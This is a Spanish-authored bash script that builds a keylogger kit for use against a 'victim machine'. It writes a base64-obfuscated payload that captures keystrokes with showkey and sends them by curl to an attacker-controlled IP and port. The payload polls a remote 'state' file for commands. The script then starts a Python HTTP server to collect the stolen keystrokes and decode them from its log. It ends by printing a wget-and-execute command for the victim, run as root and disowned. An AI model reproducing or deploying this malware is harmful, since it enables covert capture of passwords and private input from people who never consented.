#!/bin/bash

#Autor: Adrian Ledesma Bello
#Link: https://www.canalhacker.com

echo -e "\e[37m _______      \e[34m                                                          ______            \e[m"
echo -e "\e[37m!   ____!      >><<       NAL     N       ====       L       \e[34m {}   /k  !  ____!  Y\    /Y "
echo -e "\e[37m!  |         ==    ==     N \L    N     >>    <<     L       \e[34m {}  /k   ! |____    \Y  Y/  "
echo -e "\e[37m!  |        >>!!!!!!<<    N  \L   N    ==!!!!!!==    L       \e[34m {}XZ     !  ____!    Y\/Y   "
echo -e "\e[37m!  |____   ==        ==   N   \L  N   >>        <<   L       \e[34m {}  \k   ! |____      ||    "
echo -e "\e[37m!_______! ==          ==  N    \LAN  >>          <<  LLLLLLL \e[34m {}   \k  !______!     ||    "
echo -e "\e[m"

if [ "$1" == '--help' ] || [ "$1" == '-h' ];then #Help
	echo -e "\e[97mUsage:\e[0m $0 ip port"
	echo -e "	\e[93mThis program will create a directory that include the keylogger. After that, will
	create a server with python. The keylogger will be execute in the victim machine and this will do requests
	of our file <state>.We can put in the file <state> the parameters <active/inactive/kill>.\e[0m"
	exit
fi

ip=$1
port=$2

if [ -f $2 ];then
	echo -e "Usage: $0 \e[97mip\e[0m \e[97mport\e[0m"
	exit
fi

if [ $(ls | grep $port | wc -c) -gt 3 ];then

	echo "You have already used port $port"
	exit

fi

echo '#/bin/bash' > .klg.sh #Create payload
echo "echo $(echo "IyEvYmluL2Jhc2gKCmlwPV9pcApwb3J0PV9wb3J0Cgp3aGlsZSB0cnVlO2RvCgoJc2hvd2tleSAtcyA+IC5zYXZlCgll
Y2hvICIiIiogMHgzOCAjYWx0PHsgMHgxZCAjY3RybDx9IDB4MGUgI2RlbGV0ZTxdIDB4MWMgI2VudGVyPFsgMHgzOSAjc3BhY2U8MSAweDAyIDw
yIDB4MDMgPDMgMHgwNCA8NCAweDA1IDw1IDB4MDYgPDYgMHgwNyA8NyAweDA4IDw4IDB4MDkgPDkgMHgwYSA8MCAweDBiIDwnIDB4MGMgPMKhID
B4MGQgPHEgMHgxMCA8dyAweDExIDxlIDB4MTIgPHIgMHgxMyA8dCAweDE0IDx5IDB4MTUgPHUgMHgxNiA8aSAweDE3IDxvIDB4MTggPHAgMHgxO
SA8YSAweDFlIDxzIDB4MWYgPGQgMHgyMCA8ZiAweDIxIDxnIDB4MjIgPGggMHgyMyA8aiAweDI0IDxrIDB4MjUgPGwgMHgyNiA8w7EgMHgyNyA8
eiAweDJjIDx4IDB4MmQgPGMgMHgyZSA8diAweDJmIDxiIDB4MzAgPG4gMHgzMSA8bSAweDMyIDwsIDB4MzMgPC4gMHgzNCA8LSAweDM1IDxeIDB
4MzYgPEAgMHhlMCIiIiB8IHRyICc8JyAnXG4nID4gLnR4dAoJY2F0IC5zYXZlIHwgZ3JlcCAnMHgnIHwgc2VkICcxZCcgfCBncmVwIFswLTldIH
wgeGFyZ3MgfCBzZWQgJy9eICokL2QnID4gLnRtcAoJZWNobyA+IC5zYXZlCglsZXQgbj0kKGNhdCAudG1wIHwgc2VkICdzLyAvXG4vZycgfCB3Y
yAtbCkvMjsKCglmb3IgaSBpbiBgc2VxIDEgJChjYXQgLnRtcCB8IHNlZCAncy8gL1xuL2cnIHwgd2MgLWwpYDtkbwoKCQlsZXQgdj0kaSo1OwoJ
CWNhdCAudHh0IHwgZ3JlcCAiJChjYXQgLnRtcCB8IGhlYWQgLWMgJHYgfCB0YWlsIC1jIDUpIiB8IGhlYWQgLWMgMSA+PiAuc2F2ZQoKCWRvbmU
KCgljYXQgLnNhdmUgfCBzZWQgJ3MvXF4wL1w9L2cnIHwgc2VkICdzL1xeMS9cIS9nJyB8IHNlZCAncy9cXjIvXCIvZycgfCBzZWQgJ3MvXF4zL1
zCty9nJyB8IHNlZCAncy9cXjQvXCQvZycgfCBzZWQgJ3MvXF41L1wlL2cnIHwgc2VkICdzL1xeNi9cJi9nJyB8IHNlZCAncy9cXjcvXC8vZycgf
CBzZWQgJ3MvXF44L1woL2cnIHwgc2VkICdzL1xeOS9cKS9nJyB8IHNlZCAncy9cXlwtL1xfL2cnIHwgc2VkICdzL1xeXC4vXDovZycgfCBzZWQg
J3MvXF5cLC9cOy9nJyB8IHNlZCAncy9cXlzCoS9cwr8vZycgfCBzZWQgJ3MvXF5xL1xRL2cnIHwgc2VkICdzL1xedy9cVy9nJyB8IHNlZCAncy9
cXmUvXEUvZycgfCBzZWQgJ3MvXF5yL1xSL2cnIHwgc2VkICdzL1xedC9cVC9nJyB8IHNlZCAncy9cXnkvXFkvZycgfCBzZWQgJ3MvXF51L1xVL2
cnIHwgc2VkICdzL1xeaS9cSS9nJyB8IHNlZCAncy9cXm8vXE8vZycgfCBzZWQgJ3MvXF5wL1xQL2cnIHwgc2VkICdzL1xeYS9cQS9nJyB8IHNlZ
CAncy9cXnMvXFMvZycgfCBzZWQgJ3MvXF5kL1xEL2cnIHwgc2VkICdzL1xeZi9cRi9nJyB8IHNlZCAncy9cXmcvXEcvZycgfCBzZWQgJ3MvXF5o
L1xIL2cnIHwgc2VkICdzL1xeai9cSi9nJyB8IHNlZCAncy9cXmsvXEsvZycgfCBzZWQgJ3MvXF5sL1xML2cnIHwgc2VkICdzL1xew7EvXMORL2c
nIHwgc2VkICdzL1xeei9cWi9nJyB8IHNlZCAncy9cXngvXFgvZycgfCBzZWQgJ3MvXF5jL1xDL2cnIHwgc2VkICdzL1xedi9cVi9nJyB8IHNlZC
Ancy9cXmIvXEIvZycgfCBzZWQgJ3MvXF5uL1xOL2cnIHwgc2VkICdzL1xebS9cTS9nJyB8IHNlZCAncy9cWy8gL2cnIHwgc2VkICdzL1xdL1xbR
U5URVJcXS9nJyB8IHNlZCAncy99L1xbREVMXF0vZycgfCBzZWQgJ3Mvey9cW0NUUkxcXS9nJyB8IHNlZCAncy9cKi9cW0FMVFxdL2cnIHwgc2Vk
ICdzL1xeLy9nJyB8IHNlZCAnL14gKiQvZCcgfCBiYXNlNjQgLXcgMCA+PiAucmVzLnR4dAoJY3VybCAtcyAiaHR0cDovLyRpcDokcG9ydC8kKGN
hdCAucmVzLnR4dCkiIDI+L2Rldi9udWxsCglzdGF0ZT0kKGN1cmwgLXMgImh0dHA6Ly8kaXA6JHBvcnQvc3RhdGUiIDI+L2Rldi9udWxsKQoJcm
0gLnRtcCAuc2F2ZSAudHh0IC5yZXMudHh0CgoJaWYgWyAkc3RhdGUgPT0gImtpbGwiIF07dGhlbgoKCQlybSBgcHdkYC8ua2xnLnNoIGBwd2RgL
y5zYXZlCgkJZXhpdAoKCWVsaWYgWyAkc3RhdGUgPT0gImluYWN0aXZlIiBdO3RoZW4KCgkJd2hpbGUgWyAkc3RhdGUgPT0gImluYWN0aXZlIiBd
O2RvCgoJCQlzbGVlcCAxMAoJCQlzdGF0ZT0kKGN1cmwgLXMgImh0dHA6Ly8kaXA6JHBvcnQvc3RhdGUiIDI+L2Rldi9udWxsKQoKCQlkb25lCgo
JZmkKCmRvbmUKCg==" | base64 -d | sed "s/_ip/$ip/" | sed "s/_port/$port/" | base64 -w 0) | base64 -d | bash" >> .klg.sh

if [ -r server_$port ];then #Check if this port was used before and kill it
	rm -rf server_$port
	kill "$(ps -aux | grep "python" | grep "$port" | awk -F " " '{print $2}')" 2>/dev/null
fi

mkdir server_$port #Create the directory with the files and the server
mv .klg.sh server_$port/
chmod 744 server_$port
cd server_$port
touch state
echo "active" > state

echo '#/bin/bash' > output.sh #Create file output.sh
echo 'echo -e "\e[91mThe output will not have the keys CTRL, DEL, ENTER, ALT.\nIf you want change, modify this file output.sh\e[0m"' >> output.sh
echo 'for i in $(cat .file.txt | grep 404 | grep HTTP | awk -F "GET /" '"'{print \$2}'"' | awk -F " " '"'{print \$1}'"');do' >> output.sh
echo 'echo $i | base64 -d | sed '"'s/\[CTRL\]/ /g'"' | sed '"'s/\[DEL\]/ /g'"' | sed '"'s/\[ENTER\]/ /g'"' | sed '"'s/\[ALT\]/ /g'"' #Dont have CTRL, DEL, ENTER, ALT' >> output.sh
echo -e '#echo $i | base64 -d #All keys\ndone' >> output.sh
chmod 755 output.sh

python -m SimpleHTTPServer $port 2>.file.txt 1>/dev/null & #Create server

echo -e "The server is ready in the port \e[96m$port\e[0m and route \e[96m`pwd`\e[0m"
echo -e "Execute <\e[31mwget http://$ip:$port/.klg.sh; chmod 755 .klg.sh; ./.klg.sh >/dev/null & disown -h \$! && exit\e[0m> in the victim machine as root"
